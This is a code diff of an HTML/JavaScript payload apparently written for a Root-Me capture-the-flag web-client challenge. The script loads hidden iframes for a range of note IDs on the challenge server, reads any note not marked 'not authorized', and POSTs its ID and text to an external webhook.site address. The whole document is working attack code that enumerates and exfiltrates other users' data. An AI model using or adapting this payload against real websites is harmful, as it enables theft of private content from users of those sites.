@@ -1,48 +1,44 @@
-<!DOCTYPE html>
-<html>
-<head>
-</head>
-<body>
-    <div id="status"></div>
-    <script>
-    const TARGET = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
-    const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
+<script>
+const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 
-    function sleep(ms) {
-        const end = Date.now() + ms;
-        while (Date.now() < end) {}
-    }
+function run(a = 2800, b = 3000) {
+    const container = document.body || document.documentElement;
 
-    function tryId(i) {
+    for (let i = a; i < b; i++) {
         const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+
         iframe.onload = () => {
-            console.log("loaded:", i);
-        };
-        iframe.onerror = () => {
-            console.log("error:", i);
-        };
-        iframe.src = TARGET + i;
-        document.body.appendChild(iframe);
-        sleep(10000);
-        /* 
-        const doc = iframe.contentDocument;
-        const text = doc.body.textContent.trim();
+            try {
+                const doc = iframe.contentDocument;
+                const text = doc.body.textContent.trim();
 
-        if (!text.includes("not authorized")) {
-            console.log("FOUND", i);
-        }
-        else {
+                if (!text.includes("not authorized")) {
+                    console.log("FOUND", i);
+
+                    fetch(WEBHOOK, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            id: i,
+                            data: text
+                        })
+                    });
+                }
+            } catch (e) {
+                console.log("error", i);
+            }
+
             iframe.remove();
-        }
-        */
-        iframe.remove();
+        };
+
+        iframe.src = TARGET + i;
+        container.appendChild(iframe);
     }
+}
 
-    for (let i = 2810; i < 2812; i++) {
-        tryId(i);
-    }
-
-    </script>
-</body>
-
-</html>
+run();
+</script>
